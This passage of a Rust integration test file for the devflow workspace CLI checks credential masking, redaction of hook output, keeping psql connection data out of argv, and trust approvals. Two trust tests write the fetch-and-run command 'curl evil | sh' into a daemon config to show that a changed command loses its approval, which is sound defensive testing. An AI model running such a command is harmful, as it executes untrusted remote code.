                "[hooks]\nsetup = [\"true\", {{ run = \"tool --auth {MARK}\", timeout = \"bad\" }}]\n"
            ),
            "hooks.setup[1].timeout: expected a duration like",
        ),
        (
            format!("[services.db]\nengine = \"postgres\"\nmode = \"bad`, expected {MARK}\"\n"),
            "services.db.mode: unknown value (expected `managed` or `external`)",
        ),
        (
            format!("[services.db]\nengine = \"postgres\"\nadmin_url = {MARK}\n"),
            "invalid TOML in",
        ),
        (
            format!("[services.db]\nengine = \"postgres\"\nextra_databases = [\"{MARK}\"]\n"),
            "services.db.extra_databases[0]: not a valid name",
        ),
        (
            format!(
                "[hooks]\nsetup = [{{ name = \"{MARK}\", run = \"x\" }}, {{ name = \"{MARK}\", run = \"y\" }}]\n"
            ),
            "hooks.setup[1]: `name` is already used by hooks.setup[0]",
        ),
    ];
    for (body, wanted) in &broken {
        std::fs::write(env.config_path(), format!("{head}{body}")).unwrap();
        for args in [
            vec!["list"],
            vec!["--json", "list"],
            vec!["doctor"],
            vec!["--json", "doctor"],
            vec!["--non-interactive", "setup"],
            vec!["--json", "db", "url"],
        ] {
            let out = env.run(&args);
            let text = describe(&out);
            // `doctor` may report the problem as a failed check; the rest fail.
            assert!(
                !out.status.success() || args.contains(&"doctor"),
                "{args:?}\n{text}"
            );
            if !args.contains(&"doctor") {
                assert!(
                    text.contains(wanted),
                    "{args:?} should say {wanted:?}\n{text}"
                );
            }
            assert!(!text.contains(MARK), "{args:?} leaks the value:\n{text}");
            assert!(
                !text.contains("--auth"),
                "{args:?} leaks the command:\n{text}"
            );
        }
    }
}

#[test]
fn credentials_in_urls_are_masked_in_every_output_but_db_url() {
    let env = Env::new();
    env.init();
    // Attaching records the URL in the receipt, which later commands print.
    let attached = "postgres://demo@127.0.0.1:1/appdb?password=QUERYSECRET";
    let out = env.run(&["--non-interactive", "setup", "--database-url", attached]);
    ok(&out);
    for (args, label) in [
        (["--json", "list"].as_slice(), "list --json"),
        (["list"].as_slice(), "list"),
        (["--json", "doctor"].as_slice(), "doctor --json"),
    ] {
        let out = env.run(args);
        let text = describe(&out);
        assert!(!text.contains("QUERYSECRET"), "{label}:\n{text}");
    }
    let doc = json(&env.run(&["--json", "list"]));
    assert_eq!(
        doc["workspaces"][0]["receipt"]["services"]["db"]["url"],
        "postgres://demo@127.0.0.1:1/appdb?password=***"
    );
    // `db url` exists to hand the credential out.
    assert_eq!(stdout(&env.run(&["db", "url"])).trim(), attached);
    let doc = json(&env.run(&["--json", "db", "url"]));
    assert_eq!(doc["url"], attached);
}

#[test]
fn a_service_key_that_looks_like_a_secret_keeps_its_binding_structure() {
    // `tokens` and `password_store` are valid service keys; masking must not
    // turn `receipt.services.<key>` into a string, or an agent reading the
    // documented schema loses the engine and the branch id.
    for key in ["tokens", "password_store"] {
        let env = Env::new();
        env.init();
        env.edit_config(
            "[hooks]",
            &format!("[services.{key}]\nengine = \"postgres\"\nmode = \"external\"\n\n[hooks]"),
        );
        let attached = "postgres://demo:QUERYSECRET@127.0.0.1:1/appdb";
        let out = env.run(&[
            "--json",
            "--non-interactive",
            "setup",
            "--database-url",
            attached,
        ]);
        ok(&out);
        let setup = json(&out);
        let listed = json(&env.run(&["--json", "list"]));
        for (label, receipt) in [
            ("setup", &setup["receipt"]),
            ("list", &listed["workspaces"][0]["receipt"]),
        ] {
            let binding = &receipt["services"][key];
            assert!(binding.is_object(), "{label} {key}: {receipt}");
            assert_eq!(binding["engine"], "postgres", "{label} {key}");
            assert_eq!(binding["database"], "appdb", "{label} {key}");
            assert_eq!(
                binding["url"], "postgres://demo:***@127.0.0.1:1/appdb",
                "{label} {key}"
            );
            assert_eq!(receipt["phases"]["services"]["state"], "done");
        }
        let text = describe(&env.run(&["--json", "list"]));
        assert!(!text.contains("QUERYSECRET"), "{key}: {text}");
    }
}

#[test]
fn hook_output_is_redacted() {
    let env = Env::new();
    env.init();
    env.edit_config(
        "setup = []",
        "setup = [\"echo postgres://u:HUNTERTWO@h/db and password=QUERYSECRET\"]",
    );
    let out = env
        .command(&env.repo)
        .args(["--json", "--non-interactive", "switch", "-c", "feature/r"])
        .env("DEVFLOW_TRUST_HOOKS", "1")
        .output()
        .unwrap();
    ok(&out);
    let text = describe(&out);
    assert!(text.contains("postgres://u:***@h/db"), "{text}");
    assert!(
        !text.contains("HUNTERTWO") && !text.contains("QUERYSECRET"),
        "{text}"
    );
}

/// The environment of the process under test with a fake program first on PATH.
fn with_fake_path(command: &mut Command, programs: &[&FakeProgram], system: bool) {
    let mut dirs: Vec<String> = programs
        .iter()
        .map(|program| program.dir.display().to_string())
        .collect();
    if system {
        dirs.extend(["/usr/bin".to_string(), "/bin".to_string()]);
    }
    command.env("PATH", dirs.join(":"));
    for program in programs {
        command.env("FAKE_LOG", &program.log);
    }
}

/// Point the main checkout's receipt at `url`. The receipt is edited directly
/// (after a first `setup --database-url`), so forms that `setup` itself might
/// refuse still reach the commands that read the receipt.
fn attach(env: &Env, url: &str) {
    let receipt = env.repo.join(".git/devflow/receipt.json");
    if !receipt.exists() {
        ok(&env.run(&[
            "--non-interactive",
            "setup",
            "--database-url",
            "postgres://placeholder@127.0.0.1:1/placeholder",
        ]));
    }
    let mut doc: Value = serde_json::from_str(&std::fs::read_to_string(&receipt).unwrap()).unwrap();
    doc["services"]["db"]["url"] = Value::String(url.to_string());
    std::fs::write(&receipt, serde_json::to_string_pretty(&doc).unwrap()).unwrap();
}

/// Mark the attached binding as a branch provisioned by the project's server.
fn provisioned(env: &Env) {
    let receipt = env.repo.join(".git/devflow/receipt.json");
    let mut doc: Value = serde_json::from_str(&std::fs::read_to_string(&receipt).unwrap()).unwrap();
    doc["services"]["db"]["branch_id"] = Value::String(uuid::Uuid::new_v4().to_string());
    std::fs::write(&receipt, serde_json::to_string_pretty(&doc).unwrap()).unwrap();
}

#[cfg(unix)]
#[test]
fn db_psql_never_redirects_an_attached_url_into_the_managed_container() {
    let env = Env::new();
    env.init();
    env.edit_config(
        "[hooks]",
        "[services.db]\nengine = \"postgres\"\nmode = \"managed\"\nimage = \"postgres:18\"\n\n[hooks]",
    );
    attach(
        &env,
        "postgres://remote_user:pw@remote.example:6000/remote_db",
    );
    let docker = env.fake_program("docker", &recording_script(0));
    let mut command = env.command(&env.repo);
    command.args(["db", "psql"]);
    with_fake_path(&mut command, &[&docker], false);
    let out = command.output().unwrap();
    assert!(!out.status.success());
    assert!(
        String::from_utf8_lossy(&out.stderr).contains("psql was not found"),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(!docker.log.exists(), "docker must not be invoked");
}

/// Marks a connection variable that was not set in the recorded environment.
#[cfg(unix)]
const UNSET: &str = "<unset>";

/// A fake `psql` or `docker`: records its arguments and every libpq
/// connection variable of its environment, then exits with `code`. Shell
/// builtins only, so it also runs where PATH holds nothing else.
#[cfg(unix)]
fn recording_script(code: i32) -> String {
    let names: Vec<&str> = devflow_core::conn::libpq_env_vars().collect();
    format!(
        r#"{{
  for a in "$@"; do printf 'ARG=%s\n' "$a"; done
  for v in {names}; do
    eval "val=\${{$v-{UNSET}}}"
    printf 'ENV=%s=%s\n' "$v" "$val"
  done
}} > "$FAKE_LOG"
exit {code}"#,
        names = names.join(" "),
    )
}

#[cfg(unix)]
impl FakeProgram {
    /// The connection variables set in the program's environment.
    fn connection_env(&self) -> std::collections::BTreeMap<String, String> {
        self.lines()
            .iter()
            .filter_map(|line| line.strip_prefix("ENV="))
            .filter_map(|pair| pair.split_once('='))
            .filter(|(_, value)| *value != UNSET)
            .map(|(name, value)| (name.to_string(), value.to_string()))
            .collect()
    }
}

#[cfg(unix)]
fn vars(pairs: &[(&str, &str)]) -> std::collections::BTreeMap<String, String> {
    pairs
        .iter()
        .map(|(name, value)| (name.to_string(), value.to_string()))
        .collect()
}

/// `devflow db psql` with a fake `psql` first on PATH.
#[cfg(unix)]
fn run_psql(env: &Env, psql: &FakeProgram, extra_env: &[(&str, &str)]) -> Output {
    let mut command = env.command(&env.repo);
    command.args(["db", "psql"]).envs(extra_env.iter().copied());
    with_fake_path(&mut command, &[psql], true);
    command.output().unwrap()
}

#[cfg(unix)]
#[test]
fn db_psql_passes_the_connection_in_the_environment_only() {
    let env = Env::new();
    env.init();
    attach(
        &env,
        "postgres://demo:s3cr%3At@127.0.0.1:1/appdb?sslmode=disable",
    );
    let psql = env.fake_program("psql", &recording_script(7));
    let tmp = env.root.join("tmp");
    std::fs::create_dir_all(&tmp).unwrap();
    let out = run_psql(&env, &psql, &[("TMPDIR", tmp.to_str().unwrap())]);

    // psql's status is devflow's status.
    assert_eq!(out.status.code(), Some(7), "{}", describe(&out));
    let log = psql.lines().join("\n");
    assert!(psql.args().is_empty(), "connection data in argv:\n{log}");
    assert_eq!(
        psql.connection_env(),
        vars(&[
            ("PGDATABASE", "appdb"),
            ("PGHOST", "127.0.0.1"),
            ("PGPASSWORD", "s3cr:t"),
            ("PGPORT", "1"),
            ("PGSSLMODE", "disable"),
            ("PGUSER", "demo"),
        ]),
        "{log}"
    );
    // No temporary file of any kind, and nothing echoed.
    assert_eq!(std::fs::read_dir(&tmp).unwrap().count(), 0);
    assert!(!describe(&out).contains("s3cr"), "{}", describe(&out));
}

#[cfg(unix)]
#[test]
fn db_psql_reads_the_url_the_way_libpq_does() {
    let env = Env::new();
    env.init();
    let psql = env.fake_program("psql", &recording_script(0));
    for (url, expected) in [
        // A percent-encoded parameter name is still the password.
        (
            "postgres://demo@h:5/appdb?%70assword=ENCSECRET",
            vars(&[
                ("PGDATABASE", "appdb"),
                ("PGHOST", "h"),
                ("PGPASSWORD", "ENCSECRET"),
                ("PGPORT", "5"),
                ("PGUSER", "demo"),
            ]),
        ),
        // Query parameters override the URL's own components, as in libpq:
        // the password, the host and the port all follow the query.
        (
            "postgres://demo:authpw@h:5/appdb?password=querypw&host=otherhost&port=7",
            vars(&[
                ("PGDATABASE", "appdb"),
                ("PGHOST", "otherhost"),
                ("PGPASSWORD", "querypw"),
                ("PGPORT", "7"),
                ("PGUSER", "demo"),
            ]),
        ),
        // Without a password, nothing is invented: ~/.pgpass applies.
        (
            "postgres://demo@h:5/appdb",
            vars(&[
                ("PGDATABASE", "appdb"),
                ("PGHOST", "h"),
                ("PGPORT", "5"),
                ("PGUSER", "demo"),
            ]),
        ),
        // The key/value form is accepted too.
        (
            "host=h port=5 dbname=appdb user=demo password='a b'",
            vars(&[
                ("PGDATABASE", "appdb"),
                ("PGHOST", "h"),
                ("PGPASSWORD", "a b"),
                ("PGPORT", "5"),
                ("PGUSER", "demo"),
            ]),
        ),
        // Options libpq does not know stay out of the environment.
        (
            "postgres://demo@h/appdb?schema=public",
            vars(&[("PGDATABASE", "appdb"), ("PGHOST", "h"), ("PGUSER", "demo")]),
        ),
    ] {
        attach(&env, url);
        ok(&run_psql(&env, &psql, &[]));
        assert!(psql.args().is_empty(), "{url}: {:?}", psql.args());
        assert_eq!(psql.connection_env(), expected, "{url}");
    }
}

#[cfg(unix)]
#[test]
fn db_psql_ignores_connection_variables_inherited_from_the_caller() {
    let env = Env::new();
    env.init();
    let psql = env.fake_program("psql", &recording_script(0));
    // Every connection variable libpq knows, exported by the caller's shell.
    let inherited: Vec<(&str, &str)> = devflow_core::conn::libpq_env_vars()
        .map(|name| (name, "inherited"))
        .collect();

    attach(&env, "postgres://demo:wspw@h:5/appdb");
    ok(&run_psql(&env, &psql, &inherited));
    assert_eq!(
        psql.connection_env(),
        vars(&[
            ("PGDATABASE", "appdb"),
            ("PGHOST", "h"),
            ("PGPASSWORD", "wspw"),
            ("PGPORT", "5"),
            ("PGUSER", "demo"),
        ]),
        "an inherited variable overrode or joined the workspace's"
    );

    // A workspace without a password does not borrow the caller's.
    attach(&env, "postgres://demo@h:5/appdb");
    ok(&run_psql(&env, &psql, &inherited));
    assert!(!psql.connection_env().contains_key("PGPASSWORD"));
    assert!(!psql.connection_env().contains_key("PGPASSFILE"));
}

#[cfg(unix)]
#[test]
fn db_psql_rejects_urls_the_environment_cannot_express() {
    let env = Env::new();
    env.init();
    let psql = env.fake_program("psql", &recording_script(0));
    for (url, mention) in [
        (
            "postgres://demo@h:5/appdb?sslpassword=SSLSECRET",
            "sslpassword",
        ),
        ("postgres://demo:HOSTSECRET@h1,h2/appdb", "several hosts"),
    ] {
        attach(&env, url);
        let out = run_psql(&env, &psql, &[]);
        failed(&out);
        let text = describe(&out);
        assert!(text.contains(mention), "{url}:\n{text}");
        assert!(
            !text.contains("SSLSECRET") && !text.contains("HOSTSECRET"),
            "{text}"
        );
        assert!(!psql.log.exists(), "psql ran for {url}");
    }
}

#[cfg(unix)]
#[test]
fn db_psql_leaves_signal_handling_to_psql() {
    use std::os::unix::process::ExitStatusExt;
    // A test run started as a background job of a non-interactive shell ignores
    // SIGINT itself, and then an inherited disposition cannot be told apart.
    let probe = Command::new("sh")
        .args(["-c", "kill -INT $$; echo survived"])
        .output()
        .unwrap();
    if String::from_utf8_lossy(&probe.stdout).contains("survived") {
        eprintln!("SIGINT is ignored in this environment; skipping");
        return;
    }
    let env = Env::new();
    env.init();
    attach(&env, "postgres://demo:pw@h:5/appdb");
    let psql = env.fake_program(
        "psql",
        r#"printf 'started\n' > "$FAKE_LOG"
kill -INT $$
printf 'survived\n' >> "$FAKE_LOG""#,
    );
    let out = run_psql(&env, &psql, &[]);
    let log = std::fs::read_to_string(&psql.log).unwrap();
    // Ctrl-C reaches psql with its default disposition: it ends the program.
    assert_eq!(log, "started\n", "psql inherited an ignored SIGINT");
    assert!(
        out.status.signal() == Some(2) || out.status.code() == Some(130),
        "{}",
        describe(&out)
    );
}

#[cfg(unix)]
#[test]
fn db_psql_in_the_container_gets_the_connection_from_the_environment() {
    let env = Env::new();
    env.init();
    env.edit_config(
        "[hooks]",
        "[services.db]\nengine = \"postgres\"\nmode = \"managed\"\nimage = \"postgres:18\"\n\n[hooks]",
    );
    attach(
        &env,
        "postgres://demo:dockerpw@127.0.0.1:55432/appdb?sslmode=disable",
    );
    // A branch the managed server provisioned (only those go through its container).
    provisioned(&env);
    // No psql on PATH at all: only the fake docker.
    let docker = env.fake_program("docker", &recording_script(0));
    let mut command = env.command(&env.repo);
    command.args(["db", "psql"]);
    for name in devflow_core::conn::libpq_env_vars() {
        command.env(name, "inherited");
    }
    with_fake_path(&mut command, &[&docker], false);
    let out = command.output().unwrap();
    ok(&out);

    let args = docker.args();
    let log = docker.lines().join("\n");
    let exec = args.iter().position(|arg| arg == "exec").expect(&log);
    assert_eq!(&args[..2], ["compose", "-p"], "{args:?}");
    // Variables are forwarded by name; no value is on the command line.
    let rest = &args[exec + 1..];
    assert_eq!(&rest[rest.len() - 2..], ["pg", "psql"], "{args:?}");
    let forwarded = &rest[..rest.len() - 2];
    assert!(forwarded.chunks(2).all(|pair| pair[0] == "-e"), "{args:?}");
    let mut names: Vec<&str> = forwarded.chunks(2).map(|pair| pair[1].as_str()).collect();
    names.sort_unstable();
    assert_eq!(
        names,
        [
            "PGDATABASE",
            "PGHOST",
            "PGPASSWORD",
            "PGPORT",
            "PGSSLMODE",
            "PGUSER"
        ],
        "{args:?}"
    );
    assert!(
        !args.iter().any(|arg| arg.contains("dockerpw")
            || arg.contains("inherited")
            || arg.contains("55432")),
        "connection data reached argv: {args:?}"
    );
    // The client's environment: the workspace's values, the server as seen
    // from inside its container, and nothing inherited.
    assert_eq!(
        docker.connection_env(),
        vars(&[
            ("PGDATABASE", "appdb"),
            ("PGHOST", "127.0.0.1"),
            ("PGPASSWORD", "dockerpw"),
            ("PGPORT", "5432"),
            ("PGSSLMODE", "disable"),
            ("PGUSER", "demo"),
        ]),
        "{log}"
    );
}

#[test]
fn switch_create_runs_switch_hooks_on_first_entry() {
    let env = Env::new();
    env.init();
    env.edit_config(
        "setup = []",
        "setup = []\nswitch = [\"echo entered >> switch-ran.txt\"]",
    );
    let trusted = |args: &[&str]| {
        env.command(&env.repo)
            .args(args)
            .env("DEVFLOW_TRUST_HOOKS", "1")
            .output()
            .unwrap()
    };

    let out = trusted(&["--json", "--non-interactive", "switch", "-c", "feature/s"]);
    ok(&out);
    let doc = json(&out);
    assert_eq!(doc["status"], "ready", "{doc}");
    assert_eq!(doc["created"], true);
    assert_eq!(doc["switch_hooks"]["phase"], "switch", "{doc}");
    assert_eq!(doc["switch_hooks"]["ok"], true, "{doc}");
    let path = PathBuf::from(doc["path"].as_str().unwrap());
    assert_eq!(
        std::fs::read_to_string(path.join("switch-ran.txt")).unwrap(),
        "entered\n"
    );

    // Switching to the existing workspace runs them again, and reports them
    // the same way: `switch_hooks`, apart from the setup run's `hooks`.
    let doc = json(ok(&trusted(&[
        "--json",
        "--non-interactive",
        "switch",
        "feature/s",
    ])));
    assert_eq!(doc["switch_hooks"]["phase"], "switch", "{doc}");
    assert_eq!(doc["switch_hooks"]["ok"], true, "{doc}");
    assert!(doc["hooks"].is_null(), "no setup hook ran: {doc}");
    assert_eq!(
        std::fs::read_to_string(path.join("switch-ran.txt")).unwrap(),
        "entered\nentered\n"
    );

    // A failing switch hook is a warning: the workspace exists and is ready.
    env.edit_config("echo entered >> switch-ran.txt", "exit 3");
    let out = trusted(&["--json", "--non-interactive", "switch", "-c", "feature/f"]);
    ok(&out);
    let doc = json(&out);
    assert_eq!(doc["status"], "ready", "{doc}");
    assert_eq!(doc["switch_hooks"]["ok"], false, "{doc}");
    assert!(
        doc["warnings"][0].as_str().unwrap().contains("exit 3"),
        "{doc}"
    );

    // --no-hooks and untrusted hooks run nothing; untrusted says so.
    env.edit_config("exit 3", "echo entered >> switch-ran.txt");
    let out = trusted(&[
        "--json",
        "--non-interactive",
        "switch",
        "-c",
        "feature/n",
        "--no-hooks",
    ]);
    ok(&out);
    let doc = json(&out);
    assert!(doc.get("switch_hooks").is_none(), "{doc}");
    assert!(
        !Path::new(doc["path"].as_str().unwrap())
            .join("switch-ran.txt")
            .exists()
    );
    let out = env.run(&["--json", "--non-interactive", "switch", "-c", "feature/u"]);
    ok(&out);
    let doc = json(&out);
    assert!(doc.get("switch_hooks").is_none(), "{doc}");
    assert!(
        doc["warnings"][0].as_str().unwrap().contains("not trusted"),
        "{doc}"
    );
}

#[test]
fn a_busy_workspace_is_in_progress_not_an_error() {
    let env = Env::new();
    env.init();
    // Another devflow process holds the main checkout's setup lock.
    let lock = Receipt::try_lock(&env.repo.join(".git")).unwrap().unwrap();

    let out = env.run(&["--json", "--non-interactive", "setup"]);
    assert_eq!(out.status.code(), Some(2), "{}", describe(&out));
    let doc = json(&out);
    assert_eq!(doc["command"], "setup");
    assert_eq!(doc["status"], "in_progress", "{doc}");
    assert!(doc.get("error").is_none(), "{doc}");
    assert!(
        doc["detail"].as_str().unwrap().contains("already running"),
        "{doc}"
    );

    let listed = json(&env.run(&["--json", "list"]));
    let default = listed["workspaces"][0]["workspace"]["name"]
        .as_str()
        .unwrap();
    let out = env.run(&["--json", "--non-interactive", "switch", default]);
    assert_eq!(out.status.code(), Some(2), "{}", describe(&out));
    let doc = json(&out);
    assert_eq!(doc["command"], "switch");
    assert_eq!(doc["status"], "in_progress", "{doc}");
    assert_eq!(doc["workspace"]["name"], default, "{doc}");

    let out = env.run(&["--non-interactive", "setup"]);
    assert_eq!(out.status.code(), Some(2), "{}", describe(&out));
    assert!(
        stderr(&out).contains("still being set up"),
        "{}",
        describe(&out)
    );

    // The Git hook stays silent and never fails Git.
    let out = env.run(&["setup", "--from-git-hook"]);
    ok(&out);
    assert!(stderr(&out).is_empty(), "{}", describe(&out));
    assert!(stdout(&out).is_empty(), "{}", describe(&out));

    drop(lock);
    ok(&env.run(&["--json", "--non-interactive", "setup"]));
}

#[test]
fn removal_protections_carry_a_typed_hint() {
    let env = Env::new();
    env.init();
    let doc = json(ok(&env.run(&[
        "--json",
        "--non-interactive",
        "switch",
        "-c",
        "feature/d",
    ])));
    let path = PathBuf::from(doc["path"].as_str().unwrap());
    std::fs::write(path.join("README.md"), "changed\n").unwrap();

    let out = env.run(&["remove", "feature/d"]);
    failed(&out);
    assert!(path.is_dir());
    assert!(
        stderr(&out).contains("hint: run `devflow remove feature/d --force`"),
        "{}",
        describe(&out)
    );
    let out = env.run(&["--json", "remove", "feature/d"]);
    failed(&out);
    let doc = json(&out);
    assert!(
        doc["hint"]
            .as_str()
            .unwrap()
            .contains("devflow remove feature/d --force"),
        "{doc}"
    );

    // A protection --force cannot override has no such hint.
    let out = env.run(&["--json", "remove", "main"]);
    failed(&out);
    assert!(json(&out).get("hint").is_none());

    ok(&env.run(&["--json", "remove", "feature/d", "--force"]));
    assert!(!path.exists());
}

#[test]
fn the_force_hint_of_a_refused_removal_repeats_delete_branch() {
    // The reproduction: the refusal about the branch told the person to run
    // `devflow remove X --force`; doing that removed the worktree and silently
    // kept the branch they had asked to delete.
    let env = Env::new();
    env.init();
    let doc = json(ok(&env.run(&[
        "--json",
        "--non-interactive",
        "switch",
        "-c",
        "feature/e",
    ])));
    let path = PathBuf::from(doc["path"].as_str().unwrap());
    // A commit the default workspace does not have.
    let git = git2::Repository::open(&path).unwrap();
    std::fs::write(path.join("extra.txt"), "work\n").unwrap();
    let mut index = git.index().unwrap();
    index.add_path(Path::new("extra.txt")).unwrap();
    index.write().unwrap();
    let tree = git.find_tree(index.write_tree().unwrap()).unwrap();
    let sig = git2::Signature::now("Test", "test@example.com").unwrap();
    let parent = git.head().unwrap().peel_to_commit().unwrap();
    git.commit(Some("HEAD"), &sig, &sig, "work", &tree, &[&parent])
        .unwrap();
    drop(tree);
    drop(parent);
    drop(git);

    let out = env.run(&["remove", "feature/e", "--delete-branch"]);
    failed(&out);
    assert!(path.is_dir(), "refused before any effect");
    assert!(
        stderr(&out).contains("hint: run `devflow remove feature/e --force --delete-branch`"),
        "{}",
        describe(&out)
    );
    let out = env.run(&["--json", "remove", "feature/e", "--delete-branch"]);
    failed(&out);
    let doc = json(&out);
    assert!(
        doc["hint"]
            .as_str()
            .unwrap()
            .contains("devflow remove feature/e --force --delete-branch"),
        "{doc}"
    );
    // Running the hint does what was asked, the branch included.
    let doc = json(ok(&env.run(&[
        "--json",
        "remove",
        "feature/e",
        "--force",
        "--delete-branch",
    ])));
    assert_eq!(doc["deleted_branch"], true, "{doc}");
    assert!(!path.exists());
    let git = git2::Repository::open(&env.repo).unwrap();
    assert!(
        git.find_branch("feature/e", git2::BranchType::Local)
            .is_err(),
        "the branch is gone"
    );

    // Without the flag the hint does not grow one.
    let doc = json(ok(&env.run(&[
        "--json",
        "--non-interactive",
        "switch",
        "-c",
        "feature/f",
    ])));
    let path = PathBuf::from(doc["path"].as_str().unwrap());
    std::fs::write(path.join("README.md"), "changed\n").unwrap();
    let out = env.run(&["remove", "feature/f"]);
    failed(&out);
    assert!(
        stderr(&out).contains("hint: run `devflow remove feature/f --force` to override"),
        "{}",
        describe(&out)
    );
    // Nor does a plain forced removal claim to have kept a branch it was never
    // asked about.
    let out = env.run(&["remove", "feature/f", "--force"]);
    ok(&out);
    assert!(
        !stdout(&out).contains("kept the Git branch"),
        "{}",
        describe(&out)
    );
}

#[test]
fn a_missing_config_suggests_init() {
    let env = Env::new();
    let out = env.run(&["list"]);
    failed(&out);
    assert!(
        stderr(&out).contains("hint: run `devflow init`"),
        "{}",
        describe(&out)
    );
    let doc = json(&env.run(&["--json", "list"]));
    assert!(
        doc["hint"].as_str().unwrap().contains("devflow init"),
        "{doc}"
    );

    let doc = json(&env.run(&["--json", "doctor"]));
    let project = doc["checks"]
        .as_array()
        .unwrap()
        .iter()
        .find(|check| check["name"] == "project")
        .unwrap();
    assert!(
        project["remedies"][0]["command"] == "devflow init"
            && !project["hint"].as_str().unwrap().contains("`devflow"),
        "{project}"
    );
}

#[test]
fn trust_covers_env_recipes_and_pitchfork_processes_and_flags_autonomous_ones() {
    let env = Env::new();
    env.init();
    // A fresh project asks for nothing.
    let doc = json(ok(&env.run(&["--json", "trust"])));
    assert_eq!(doc["trust"]["state"], "nothing_to_approve", "{doc}");
    assert_eq!(
        doc["scope"]["processes"]["layers"],
        serde_json::json!([]),
        "{doc}"
    );
    assert!(stdout(&ok(&env.run(&["trust"])).clone()).contains("Nothing to approve"));

    // No hooks at all, yet a daemon with a schedule and an [env] recipe are
    // something to approve; the daemon is flagged as starting without devflow.
    std::fs::write(
        env.repo.join("pitchfork.toml"),
        "[daemons.api]\nrun = \"bun run dev\"\ndir = \"web\"\nenv = { PORT = \"3000\" }\ncron = \"0 * * * *\"\n",
    )
    .unwrap();
    std::fs::write(
        env.repo.join("pitchfork.local.toml"),
        "[daemons.worker]\nrun = \"bun run worker\"\nboot_start = true\n",
    )
    .unwrap();
    let text = std::fs::read_to_string(env.config_path()).unwrap();
    std::fs::write(
        env.config_path(),
        format!("{text}\n[env]\npresets = [\"prisma\"]\nAUTH = \"${{PGUSER}}:${{PGPASSWORD}}\"\n"),
    )
    .unwrap();
    let doc = json(ok(&env.run(&["--json", "trust"])));
    assert_eq!(doc["trust"]["state"], "untrusted", "{doc}");
    assert_eq!(doc["trust"]["format_changed"], false, "{doc}");
    let layers = doc["scope"]["processes"]["layers"].as_array().unwrap();
    assert_eq!(layers.len(), 2, "{doc}");
    assert_eq!(layers[0]["file"], "pitchfork.toml");
    assert_eq!(layers[0]["daemons"][0]["run"], "bun run dev");
    assert_eq!(layers[0]["daemons"][0]["dir"], "web");
    assert_eq!(layers[0]["daemons"][0]["fields"]["env"]["PORT"], "3000");
    assert_eq!(layers[1]["file"], "pitchfork.local.toml", "local last");
    let triggers: Vec<_> = doc["scope"]["processes"]["autonomous"]
        .as_array()
        .unwrap()
        .iter()
        .map(|t| {
            format!(
                "{}:{}",
                t["daemon"].as_str().unwrap(),
                t["trigger"].as_str().unwrap()
            )
        })
        .collect();
    assert_eq!(triggers, ["api:cron", "worker:boot_start"], "{doc}");
    assert_eq!(
        doc["scope"]["env"]["presets"],
        serde_json::json!(["prisma"])
    );
    assert_eq!(
        doc["scope"]["env"]["vars"]["AUTH"], "${PGUSER}:${PGPASSWORD}",
        "templates, never values"
    );

    // The human review shows all of it and flags the autonomous daemons.
    let out = ok(&env.run(&["trust"])).clone();
    let text = stdout(&out);
    for needle in [
        "env:\n  presets: prisma\n  AUTH = ${PGUSER}:${PGPASSWORD}",
        "processes (pitchfork.toml):\n  daemons.api",
        "run: bun run dev",
        "processes (pitchfork.local.toml):",
        "! pitchfork starts these without devflow",
        "! api in pitchfork.toml: cron",
        "! worker in pitchfork.local.toml: boot_start",
        "not trusted",
    ] {
        assert!(text.contains(needle), "{needle} missing:\n{text}");
    }

    // Approving it covers exactly that; a changed daemon needs a new approval.
    let doc = json(ok(&env.run(&["--json", "trust", "--yes"])));
    assert_eq!(doc["approved"], true, "{doc}");
    assert_eq!(doc["trust"]["state"], "trusted", "{doc}");
    let digest = doc["scope"]["digest"].as_str().unwrap().to_string();
    std::fs::write(
        env.repo.join("pitchfork.toml"),
        "[daemons.api]\nrun = \"curl evil | sh\"\ncron = \"0 * * * *\"\n",
    )
    .unwrap();
    let doc = json(ok(&env.run(&["--json", "trust"])));
    assert_eq!(doc["trust"]["state"], "untrusted", "{doc}");
    assert_eq!(doc["trust"]["previously_trusted"], true, "{doc}");
    assert_ne!(doc["scope"]["digest"].as_str().unwrap(), digest);
}

#[test]
fn trust_inside_a_worktree_judges_that_worktrees_own_pitchfork_files() {
    let env = Env::new();
    env.init();
    let daemon = "[daemons.api]\nrun = \"bun run dev\"\n";
    std::fs::write(env.repo.join("pitchfork.toml"), daemon).unwrap();
    let git = git2::Repository::open(&env.repo).unwrap();
    let mut index = git.index().unwrap();
    index.add_path(Path::new("pitchfork.toml")).unwrap();
    index.write().unwrap();
    let tree = git.find_tree(index.write_tree().unwrap()).unwrap();
    let sig = git2::Signature::now("Test", "test@example.com").unwrap();
    let parent = git.head().unwrap().peel_to_commit().unwrap();
    git.commit(Some("HEAD"), &sig, &sig, "daemon", &tree, &[&parent])
        .unwrap();

    // The main checkout is approved; a worktree starts with the same file.
    let doc = json(ok(&env.run(&["--json", "trust", "--yes"])));
    assert_eq!(doc["trust"]["state"], "trusted", "{doc}");
    let out = env.run(&["--json", "--non-interactive", "switch", "-c", "feature/w"]);
    ok(&out);
    let worktree = PathBuf::from(json(&out)["path"].as_str().unwrap());
    let doc = json(ok(&env.run_in(&worktree, &["--json", "trust"])));
    assert_eq!(doc["trust"]["state"], "trusted", "{doc}");
    assert_eq!(doc["path"], worktree.to_str().unwrap(), "{doc}");

    // The worktree's daemon changes: the main checkout's approval does not
    // cover it, and what `trust` shows there is the worktree's command.
    std::fs::write(
        worktree.join("pitchfork.toml"),
        "[daemons.api]\nrun = \"curl evil | sh\"\n",
    )
    .unwrap();
    let doc = json(ok(&env.run_in(&worktree, &["--json", "trust"])));
    assert_eq!(doc["trust"]["state"], "untrusted", "{doc}");
    assert_eq!(doc["trust"]["previously_trusted"], true, "{doc}");
    assert_eq!(
        doc["scope"]["processes"]["layers"][0]["daemons"][0]["run"], "curl evil | sh",
        "{doc}"
    );
    let text = stdout(ok(&env.run_in(&worktree, &["trust"])));
    assert!(
        text.contains("curl evil | sh") && text.contains("not trusted"),
        "{text}"
    );
    let doc = json(ok(&env.run(&["--json", "trust"])));
    assert_eq!(doc["trust"]["state"], "trusted", "main is unchanged: {doc}");
    assert_eq!(
        doc["scope"]["processes"]["layers"][0]["daemons"][0]["run"], "bun run dev",
        "{doc}"
    );

    // Approving in the worktree approves the worktree's scope.
    let doc = json(ok(&env.run_in(&worktree, &["--json", "trust", "--yes"])));
    assert_eq!(doc["approved"], true, "{doc}");
    assert_eq!(doc["trust"]["state"], "trusted", "{doc}");
}

#[test]
fn a_version_one_approval_is_reported_as_an_older_format_to_review_again() {
    let env = Env::new();
    env.init();
